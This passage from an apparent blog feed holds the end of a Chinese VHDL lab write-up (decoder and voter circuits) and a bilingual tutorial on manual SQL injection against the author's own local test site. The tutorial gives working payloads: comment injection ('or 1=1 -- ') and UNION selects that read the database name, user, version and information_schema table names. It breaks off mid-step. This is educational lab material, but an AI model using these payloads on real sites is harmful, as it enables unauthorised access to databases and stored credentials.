class="line"><span class="keyword">else</span></span><br><span class="line">enable &lt;= <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(A)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> enable = <span class="literal">true</span> <span class="keyword">then</span></span><br><span class="line"><span class="keyword">case</span> A <span class="keyword">is</span></span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;000&quot;</span> =&gt; Y &lt;= <span class="string">&quot;11111110&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;001&quot;</span> =&gt; Y &lt;= <span class="string">&quot;11111101&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;010&quot;</span> =&gt; Y &lt;= <span class="string">&quot;11111011&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;011&quot;</span> =&gt; Y &lt;= <span class="string">&quot;11110111&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;100&quot;</span> =&gt; Y &lt;= <span class="string">&quot;11101111&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;101&quot;</span> =&gt; Y &lt;= <span class="string">&quot;11011111&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;110&quot;</span> =&gt; Y &lt;= <span class="string">&quot;10111111&quot;</span>;</span><br><span class="line"><span class="keyword">when</span> <span class="string">&quot;111&quot;</span> =&gt; Y &lt;= <span class="string">&quot;01111111&quot;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Y &lt;= <span class="string">&quot;11111111&quot;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> arch;</span><br></pre></td></tr></table></figure><h4 id="代码释义：-6"><a href="#代码释义：-6" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>这段代码实现的是一个3-8译码器。其中，输入端口A是一个3位二进制码，G1、G2A和G2B是3个控制信号，Y是8位输出信号。</li><li>在这段代码中，首先通过一个process语句判断是否需要启用译码器。如果G1为1且G2A和G2B均为0，则启用译码器。否则，不启用译码器。</li><li>接着，通过另一个process语句对输入信号进行译码。如果启用了译码器，则根据输入信号的不同取值，将输出信号Y赋值为相应的8位二进制码。如果没有启用译码器，则将输出信号Y赋值为全1的8位二进制码。</li></ul><h4 id="波形结果：-6"><a href="#波形结果：-6" class="headerlink" title="波形结果："></a>波形结果：</h4><p><img src="https://s3.bmp.ovh/imgs/2023/05/24/f0fcf3573bf18558.png" alt></p><h4 id="波形解读：-6"><a href="#波形解读：-6" class="headerlink" title="波形解读："></a>波形解读：</h4><ul><li>在使能端运行工作时，即G1为1且G2A和G2B均为0时，A输入为随机三位二进制数，Y对应位置输出为0，其余输出为1。</li><li>在使能端不满足G1为1且G2A和G2B均为0时，Y输出均为1。</li></ul><h3 id="实验五：表决器"><a href="#实验五：表决器" class="headerlink" title="实验五：表决器"></a>实验五：表决器</h3><h4 id="实验代码：-7"><a href="#实验代码：-7" class="headerlink" title="实验代码："></a>实验代码：</h4><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">library</span> ieee;</span><br><span class="line"><span class="keyword">use</span> ieee.std_logic_1164.<span class="keyword">all</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">entity</span> voter_4 <span class="keyword">is</span></span><br><span class="line"><span class="keyword">port</span>(A :<span class="keyword">in</span> <span class="built_in">std_logic_vector</span>(<span class="number">3</span> <span class="keyword">downto</span> <span class="number">0</span>);</span><br><span class="line">  Y :<span class="keyword">out</span> <span class="built_in">std_logic</span>);</span><br><span class="line"><span class="keyword">end</span> voter_4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">architecture</span> arch <span class="keyword">of</span> voter_4 <span class="keyword">is</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">process</span>(A)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> A = <span class="string">&quot;1111&quot;</span> <span class="keyword">or</span> A = <span class="string">&quot;1110&quot;</span> <span class="keyword">or</span> A = <span class="string">&quot;1101&quot;</span> <span class="keyword">or</span> A = <span class="string">&quot;1011&quot;</span> <span class="keyword">or</span> A = <span class="string">&quot;0111&quot;</span> <span class="keyword">then</span></span><br><span class="line">Y &lt;= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Y &lt;= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">process</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> arch;</span><br></pre></td></tr></table></figure><h4 id="代码释义：-7"><a href="#代码释义：-7" class="headerlink" title="代码释义："></a>代码释义：</h4><ul><li>这段代码实现的是一个4选1投票器。其中，输入端口A是一个4位二进制码，Y是1位输出信号。</li><li>在这段代码中，通过一个process语句对输入信号进行判断。如果输入信号的值为”1111”、“1110”、“1101”、”1011”或”0111”中的任意一种，则将输出信号Y赋值为1。否则，将输出信号Y赋值为0。</li></ul><h4 id="波形结果：-7"><a href="#波形结果：-7" class="headerlink" title="波形结果："></a>波形结果：</h4><p><img src="https://s3.bmp.ovh/imgs/2023/05/24/943f0a77ce1a1f85.png" alt></p><h4 id="波形解读：-7"><a href="#波形解读：-7" class="headerlink" title="波形解读："></a>波形解读：</h4><ul><li>输入信号的值为”1111”、“1110”、“1101”、”1011”或”0111”中的任意一种时，输出信号Y为1。否则，输出信号Y为0。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2023/04/28/Cyber%20Security/sql%20injection/"/>
      <url>/2023/04/28/Cyber%20Security/sql%20injection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><ul><li>SQL Injection is a code injection technique that might destroy your database.</li><li>This time, we will introduce the basic technique of SQL Injection using MySQL.</li><li>I built an SQL Injection environment on my PC and did everything locally. 我是好人 :）.</li><li>SQL注入简介：<ul><li>SQL注入是通过某种方式向数据库发送非法的SQL语句，并越权获取一些信息。SQL注入常常是因为对用户的输入处理不当，导致黑客可以向数据库发送恶意的SQL语句，利用SQL语法的漏洞执行非法SQL指令获取目标信息，这些信息通常是的管理员账户和密码或者其他用户的隐私信息。</li></ul></li><li>在此篇文章中，我将讲述关于SQL的基本知识，并完成一次人工注入的渗透测试。</li></ul><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="Web程序三层架构"><a href="#Web程序三层架构" class="headerlink" title="Web程序三层架构"></a>Web程序三层架构</h3><ul><li>界面层 + 业务逻辑层 + 数据访问层</li><li>我们先来看看用户获取数据库信息的过程：<br><img src="https://s3.bmp.ovh/imgs/2023/05/01/7aa8a44d10634880.jpg" alt="user and server"></li></ul><ol><li>用户通过客户端访问网页 request www.baidu.com</li><li>客户端提交表单给前端服务器</li><li>前端服务器向后端服务器发出request请求</li><li>后端服务器给前端服务器一个API，然后向数据库发送SQL语句请求数据</li><li>数据库返回信息，后端服务器进而向前端服务器发送response</li><li>前端服务器处理完数据发送到客户端</li></ol><h3 id="SQL-基础语法"><a href="#SQL-基础语法" class="headerlink" title="SQL 基础语法"></a>SQL 基础语法</h3><ul><li>在讲语法之前，我们需要先对SQL和MySQL有一些了解：<ol><li>SQL is <strong>case insensitive</strong> SQL不区分大小写</li><li>MySQL is a <strong>relational database</strong> MySQL是关系型数据库</li><li>SQL is an ANSI standard computer language SQL是一种 ANSI 的标准计算机语言</li><li>In MySQL, all SQL statements end by <code>;</code> . 在MySQL中，所有SQL语句以分号结尾</li></ol></li></ul><ul><li>以下是我们进行SQL注入所需要了解的最基础的SQL语句<ul><li><strong>create and delete database or table</strong><ul><li>create database <code>database_database_name</code>;</li><li>drop database <code>database_name</code>;</li><li>create table <code>table_name</code> {<code>some data</code>};</li></ul></li><li><strong>select</strong><ul><li>select * from <code>table_name</code>;</li><li>select <code>col1</code>, <code>col2</code> from <code>table_name</code>;</li></ul></li><li><strong>update</strong><ul><li>update <code>table_name</code> set <code>column1</code> = <code>value1</code>, <code>column2</code> = <code>value2</code> where <code>column3</code> = <code>value3</code>;</li></ul></li><li><strong>insert</strong><ul><li>insert into <code>table_name</code> (<code>col1</code>, <code>col2</code>) values = (<code>value1</code>, <code>value2</code>);</li><li>insert into <code>table_name</code> values = (<code>values of all columns of this table</code>);</li></ul></li><li><strong>delete</strong><ul><li>delete from <code>table_name</code> where <code>col</code> = <code>value</code>;</li><li>delete from <code>table_name</code>;</li><li>delete * from <code>table_name</code>;<h3 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- create a database name DBS</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE DBS;</span><br><span class="line"><span class="comment">-- enter DBS</span></span><br><span class="line">USE DBS;</span><br><span class="line"><span class="comment">-- create a table name Persons</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">LastName <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">FirstName <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">); </span><br><span class="line"><span class="comment">-- add some data into Persons</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Persons (<span class="number">1</span>, <span class="string">&#x27;So&#x27;</span>, <span class="string">&#x27;Sam&#x27;</span>, <span class="string">&#x27;Fifth Avenue&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>);</span><br><span class="line"><span class="comment">-- add more data into Persons</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Persons (id, FirstName, LastName, Address, City) </span><br><span class="line"><span class="keyword">values</span> <span class="operator">=</span>(<span class="number">2</span>, <span class="string">&#x27;Jack&#x27;</span>, <span class="string">&#x27;So&#x27;</span>, <span class="string">&#x27;Fifth Avenue&#x27;</span>, <span class="string">&#x27;New York&#x27;</span>);</span><br><span class="line"><span class="comment">-- show all stuff in Persons</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Persons;</span><br><span class="line"><span class="comment">-- select some data to show</span></span><br><span class="line"><span class="keyword">select</span> FisrtName, Address <span class="keyword">from</span> Persons <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- change some data</span></span><br><span class="line"><span class="keyword">update</span> Persons <span class="keyword">set</span> Address <span class="operator">=</span> <span class="string">&#x27;Chinatown&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="comment">-- delete some data</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> Persons <span class="keyword">where</span> FirstName <span class="operator">=</span> `Jack`;</span><br><span class="line"><span class="comment">-- delete all stuff in Person;</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> Persons; <span class="comment">-- it is the same with &quot;delete * from Persons;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>Want to learn more? Check <a href="https://www.w3school.com.cn/sql/index.asp">3wschool</a> for further learning.</li><li>Now, since we are already familiar with the basic syntax of SQL, it is time for SQL Injection.</li></ul><h2 id="Key-of-SQL-Injection"><a href="#Key-of-SQL-Injection" class="headerlink" title="Key of SQL Injection"></a>Key of SQL Injection</h2><ul><li><strong>Comment syntax</strong> is the key of SQL Injection.<ul><li><strong>注释</strong>是SQL注入的精髓。通过注释，我们可以改变动态SQL语句的结构，忽视原本设置的一些限制，执行一些非法操作。</li></ul></li><li>SQL有两种注释：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- comment using &quot;-- &quot; note that the space is required!</span></span><br><span class="line"># comment <span class="keyword">using</span> #</span><br></pre></td></tr></table></figure></li><li>第一种注释<strong>不可以省略结尾的空格</strong></li><li>The second way (#) may not work for some database. <strong>第二种注释不一定有效</strong></li></ul><ul><li>另一个需要注意的是单引号 <code>&#39;</code><ul><li>SQL语句用只用单引号，单引号包围的是数据，在一个网页的动态SQL语句中，用户输入的数据也是用两个 <code>&#39;</code> 围着的。一般来说，两个 <code>&#39;</code>中间是一个字符串，而这个能够输入字符串并提交给网页作为动态SQL语句的一部分的输入点就是我们想要的SQL注入点。</li><li>比如这条php语句，$user 和 $passwd 是php中的变量，在网站中一般储存了用户输入的数据，它可以通过html提交的表单内容赋值或其他方法获取用户输入的数据，然后在这条语句中作为SQL语句的一部分被提交给服务器。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select * from user where name=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27; and visibility = 1;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example:"></a>Example:</h3></li></ul></li></ul><ul><li>We can use <code>&#39;</code> to end a string，then inject some SQL statement，and use <code>--</code> to disable the following statement.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#x27; or 1=1; -- </span><br></pre></td></tr></table></figure></li><li>注意，— 后有个空格</li><li>php处理之后，我们的sql语句是这样的，这也是后端服务器实际发送给数据库的SQL语句：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>; <span class="comment">-- and passwd=&#x27;$passwd&#x27; and visibility = 1;&quot;;</span></span><br></pre></td></tr></table></figure><h3 id="通用渗透目标"><a href="#通用渗透目标" class="headerlink" title="通用渗透目标"></a>通用渗透目标</h3></li><li>为了得到目标数据，我们先介绍几个渗透过程中需要注意的重要目标：<ul><li><strong>infromation_schema</strong>库：一个信息数据库，保存了MySQL服务器所维护的其他数据库的信息。</li><li><strong>schemata</strong>表：提供了当前MySQL实例中的所有数据库信息，比如show databases的结果。</li><li><strong>tables</strong>表：提供了数据库中表的信息。</li><li><strong>mysql</strong>库：MySQL的核心数据库，主要负责储存数据库用户、权限设置、关键字等mysql管理信息和内核信息。</li><li><strong>sys</strong>库：可以基于IP或用户查询谁使用了最多资源。可以查询哪张表被访问过最多次等。<h2 id="人工注入测试"><a href="#人工注入测试" class="headerlink" title="人工注入测试"></a>人工注入测试</h2></li></ul></li><li>人工注入指的是黑客不借助其他工具，人工地输入注入语句获取信息，通常需要渗透者多次尝试输入，通过抓包（或者在浏览器控制台读取Response）读取服务器反馈，侦察网站漏洞并找出合适的注入语句，进而非法获得信息。</li><li>由于本人经验有限，对工具的使用不熟练，便先以人工注入的实例进行讲解.</li><li>首先，介绍以下此次实验的环境：<ul><li>Database: <strong>MySQL 5.7.26</strong></li><li>Web servers: <strong>Apache 2.4.39</strong></li><li>Object Website: www.test.com(localhost) written in <strong>html</strong> and <strong>php</strong> </li></ul></li><li>目前测试环境网站仅能在我的电脑本地访问（毕竟没买域名也没服务器），暂时以图片的方式来展示，我会把这个测试环境的网站源码放到github上，有需要的自取-&gt;<a href="https://github.com/Momoyeyu/SQL-Injection-Environment">SQL-Injection-Environment</a></li></ul><h3 id="Comment-Injection"><a href="#Comment-Injection" class="headerlink" title="Comment Injection"></a>Comment Injection</h3><ul><li>在下面的案例中，我会演示如何利用SQL的<strong>注释</strong>以及<strong>逻辑恒等式</strong>来进行SQL注入：</li><li>首先，我们进入网站首页。<br><img src="/../../img/sqlinjection/screenshot1.png" alt></li></ul><h4 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h4><ul><li>进到首页，我们发现有四个选项，还有一些信息。不用急着先进去，可以先Ctrl + U查看网页源码（在后面的每一个网页，我们都需要查看网页源码）<br><img src="/../../img/sqlinjection/screenshot2.png"></li><li>看到源码之后，我们就有些思路了。这个网站很简单。就是一个数据库有一个表，网站可以对其进行增删改查。四个选项也对应了SQL数据库最基础的四个操作<ol><li>insert</li><li>select</li><li>update</li><li>delete</li></ol></li><li>假设我们要对这个网站进行SQL注入来获得信息，我们最主要的进攻方面应该是这个select窗口。因为select会向网站返回信息，也就是可能有<strong>回显</strong>。</li></ul><h4 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h4><ul><li>在进入select之前，别忘了网站的首页有一些文字信息。千万别放过这些有限的文字。在真实的网络环境中，比起慢慢逆向工程去挖掘技术漏洞，有时这些文字更有可能暴露出网站的问题。就是说，要学会运用伟大的<strong>社会工程学</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">公司需要更换新的通讯系统，需要各位填写一个默认邮箱，请各位及时及时录入好信息</span><br><span class="line">此次录入的信息将会被用来注册通讯系统账号，此处设置的密码会成为您在新系统的默认密码</span><br></pre></td></tr></table></figure></li><li>由这些文字，我们可以获得这些信息：<ol><li>这是一个收录用户<strong>邮箱</strong>和账户<strong>密码</strong>的网站</li><li>我们或许可以<strong>录入信息</strong>并查询自己的信息</li></ol></li><li>这为我们提供了<strong>攻击目标</strong>和重要<strong>突破口</strong></li></ul><h4 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h4><ul><li>我们进入select界面，尝试输入前，我们可以先查看源码<br><img src="/../../img/sqlinjection/sql4.png" alt></li><li>我们知道了传输方式post，输入字符上限以及name，passwd关键词。</li><li>然后随便输入一些数据看看会返回什么。<ul><li>在实际环境中，对数据输入的类型会有一定限制，比如邮箱需要用一定格式等等。实际问题中，我们可以做暴力破解之类的方式去尝试，但为了节省时间，这个环境没有特别地去限制。（毕竟这只是随便自建的垃圾靶场）</li><li>在实际的测试中，我们也可以直接输入一个 <code>&#39;</code> 符号提交，看看会不会返回SQL的报错信息，如果返回了<strong>syntax error</strong>，说明没有对<code>&#39;</code>进行过滤，因为三个 <code>&#39;</code> 必然会产生语法错误。那么这个地方有99%的可能存在SQL注入漏洞。因为它连 <code>&#39;</code> 都没有过滤。但是在这个网站行不通，因为我没有让error返回，只返回字符产 “0结果”，这也模拟了现实环境—— <strong>我们的测试不一定能够得到想要的结果。</strong> 但实际上这个网站也没有对 <code>&#39;</code> 进行过滤，只不过它不返回错误，暂时没露出马脚。<br><img src="/../../img/sqlinjection/screenshot%203.png" alt><br><img src="/../../img/sqlinjection/screenshot%204.png" alt></li></ul></li></ul><ul><li>我们发现没有返回什么有用的信息，我们可以尝试从控制台下手看看能不能获取有用的信息，按F12</li><li>点击NetWork，首先看Headers，这是浏览器捕获的数据包，当然我们也可以用WireShark等抓包工具获得更多信息，但由于这是一个简单的渗透测试，我就不把操作弄得太繁琐了。<br><img src="/../../img/sqlinjection/screenshot5.png" alt></li><li>我们先仔细看看Header：<ul><li><strong>General</strong>中我们可以看到：</li></ul><ol><li>刚才我们在select.html通过<strong>POST方法</strong>提交数据到当前页面select.php</li><li>其他还包括一些<strong>服务器位置</strong>和<strong>端口</strong>等可能有用的信息（但由于这是本地测试，所以对此例而言不用特别在意）</li><li>还有URL中出现了关键字name和passwd，这很有可能就是数据库中table的实际column名称，当然网站可以把这些名称改成别的或者隐藏，但没关系，我们后面会有其他方式获取。</li></ol><ul><li><strong>Response Headers</strong>中，我们可以发现<strong>Web Server</strong>是<strong>阿帕奇</strong>，服务器所在<strong>系统Win64</strong>。</li></ul></li><li>再看看<strong>Response</strong>的详细内容：<br><img src="/../../img/sqlinjection/screenshot%206.png" alt></li><li>没看出什么特别的。</li><li>最后看看<strong>Payload</strong>，可以看到和这个php脚本有关的一些变量：<br><img src="/../../img/sqlinjection/screenshot%207.png" alt></li></ul><h4 id="Step4"><a href="#Step4" class="headerlink" title="Step4"></a>Step4</h4><ul><li>大致探索了select，我们得到了一些可能用的信息。现在回到我们之前的发现：我们可能可以在insert界面输入数据并查询自己的信息，这为我们进一步探索select提供了思路：</li><li>先打开录入界面，尝试录入一些数据<br><img src="/../../img/sqlinjection/sql1.png" alt></li><li>发现我们可能成功录入了数据<br><img src="/2023/04/28/Cyber%20Security/sql%20injection/sqlinjection/sql2.png" alt></li><li>由于这是渗透测试，我们先让大家看看答案：实际上，<strong>数据已经录入我们的数据库中</strong>。但在后续的推导中，<strong>我们不利用在后台查询出来的信息</strong>（为了模拟真实环境），只是先让大家看看。<br><img src="/../../img/sqlinjection/sql3.png" alt></li><li>我们现在回到select界面输入我们刚才录入的信息看看：<br><img src="/../../img/sqlinjection/sql5.png" alt></li><li>可以看到，我们的信息以及被录入了。看返回的数据，有四行，我们可以知道select语句至少指定了四列返回数据。你也可以Ctrl + U 看源码和F12看控制台，但这个网站并不会返回多于我们第一次乱输入的有效信息，我就不在此做重复操作了。</li></ul><h4 id="Step5"><a href="#Step5" class="headerlink" title="Step5"></a>Step5</h4><ul><li>此前的工作都是对网站进行一个基本探索，到现在，我们已经对这个网站有了基本的了解：<ol><li>网站很简陋，从源码可以看出，功能简单直白</li><li>网站防护措施不佳，可以轻易向数据库输入数据</li><li>select界面可以返回有价值的信息</li></ol></li><li>接下来，我们就要注入了，分为以下场景：</li></ul><ol><li>我们知道用户名，但不知道密码，想要查询特定用户信息（以Momoyeyu为例：<br><img src="/../../img/sqlinjection/sql6.png" alt></li></ol><ul><li>注入注释符号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Momoyeyu&#x27; -- &quot;</span><br></pre></td></tr></table></figure><img src="/../../img/sqlinjection/sql7.png" alt></li></ul><ol><li>我们不知道用户名，也不知道密码，只想查询所有信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 -- &quot;</span><br></pre></td></tr></table></figure><img src="/../../img/sqlinjection/sql8.png" alt><br><img src="/../../img/sqlinjection/sql9.png" alt></li></ol><ul><li>由于1=1是恒等式，我们查询出了所有信息，包括管理员admin，密码nimda123，假设这个网站有管理员登录窗口，且这个管理员账户可用，那我们的SQL注入就已经取得很大成功了。但实际环境中，管理员的信息可能会加一重保险，在我这里也是这样的：<br><img src="/../../img/sqlinjection/sql3.png" alt></li><li>可以看见，在最后一列visibility中，admin的数值是1，而其他都是0，这在我写的php脚本中，这有着明确的过滤：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id, name, email, passwd from user where name=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27; and visibility = 0;&quot;</span>;</span><br></pre></td></tr></table></figure></li><li>这意味着，即使知道管理员账号密码，我们也无法登录。<br><img src="/../../img/sqlinjection/sql11.png" alt><br><img src="/../../img/sqlinjection/sql12.png" alt></li><li>因为管理员的visibility参数是1<br><img src="/../../img/sqlinjection/sql3.png" alt></li><li>如果像让管理员账号无法通过注释获取，网页可以进行一个很简单的操作：把visibility过滤前置。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id, name, email, passwd from user where visibility = 0 and name=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure></li><li>由于这是渗透测试，我没有搭建一套完整的管理员系统。对于管理员有专门过滤的系统，我也还暂时不太了解怎么渗透。但这不妨碍我们继续进行注入获取更多信息。</li></ul><h3 id="Union-attack"><a href="#Union-attack" class="headerlink" title="Union attack"></a>Union attack</h3><ul><li>在很多网页中，我们是没法一次性提交多个SQL语句的，比如我们想要注入这样一条语句：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; show databases; -- </span><br></pre></td></tr></table></figure></li><li>如果网页只允许一次提交一个SQL语句时，第二个语句就会完全被忽略，我们没法得到我们想要的数据。这时候，就可以尝试利于union select。</li><li>使用union attack有一个前提：<strong>网站有回显</strong>。也就是说，只有在网站会将select出来的数据返回，才有可能使用union attack。</li></ul><h4 id="Step1-1"><a href="#Step1-1" class="headerlink" title="Step1"></a>Step1</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 假设我们有一个数据库dbs和t1，里面有name和password</span></span><br><span class="line"><span class="keyword">select</span> name, password <span class="keyword">from</span> dbs.t1 <span class="keyword">where</span> ... <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>; <span class="comment">-- </span></span><br></pre></td></tr></table></figure><ul><li>这段语句会返回符合条件的name，password和1，2，其中1在name列，2在password列。在数据库中来看是这样的：<br><img src="/../../img/sqlinjection/dbs1.png" alt></li><li>Union其实就是把两句select语句的值整合到一个表单。利用这个语法，我们可以查询更多我们想要的信息<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name, password <span class="keyword">from</span> dbs.t1 <span class="keyword">where</span> ... <span class="keyword">union</span> <span class="keyword">select</span> database(), <span class="keyword">user</span>(); <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="/../../img/sqlinjection/dbs2.png" alt></li><li>通过这段注入，我们可以获得现在使用的database和发出指令的user。</li><li>Union语法需要注意的是，两个select返回的<strong>字段数量要相同</strong>，也就是说，我们需要猜测出前一个语句的字段数。猜测的方法比较简单：观察网站回显的字段数，这是select字段的最小值，比如网站回显了4种数据，那么select访问字段至少为4，可能会更多，因为它可能会索取更多数据，只不过不回显。这种情况也很简单，从5，6，7这样试下去就行。</li><li>还需要注意的是，有时后union前后的语句对应位置的字段如果数据类型不同，可能会报错。比如id是int类型，但我们注入返回的是string，就有可能出现问题，但这不是绝对的。</li></ul><h4 id="Step2-1"><a href="#Step2-1" class="headerlink" title="Step2"></a>Step2</h4><ul><li>接下来，我们把以下语句在select页面进行注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,database(),user(),version() -- </span></span><br></pre></td></tr></table></figure><img src="https://s3.bmp.ovh/imgs/2023/05/01/8cdcdd3b23aa6ab4.png" alt="union1"></li><li>得到：<ul><li>数据库名：test</li><li>数据库用户：root@localhost</li><li>数据库版本：5.7.26</li></ul></li><li>此外，还有如version()等可以注入的函数，就不一一列举了。</li><li>我们现在拿到了数据库名，那我们就可以进一步去获得这个数据库的所有表，然后获取表里的所有字段。</li></ul><h4 id="Step3-1"><a href="#Step3-1" class="headerlink" title="Step3"></a>Step3</h4><ul><li>还记得我们在前面提到的重要渗透目标吗？现在就需要用到他们了。首先，针对<code>Information_schema</code>库，用下面这段开始注入：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1, database(), user(), table_name from information_schema.tables where table_schema=database(); -- </span></span><br></pre></td></tr></table></figure><img src="https://s3.bmp.ovh/imgs/2023/05/01/3828369460150b68.png" 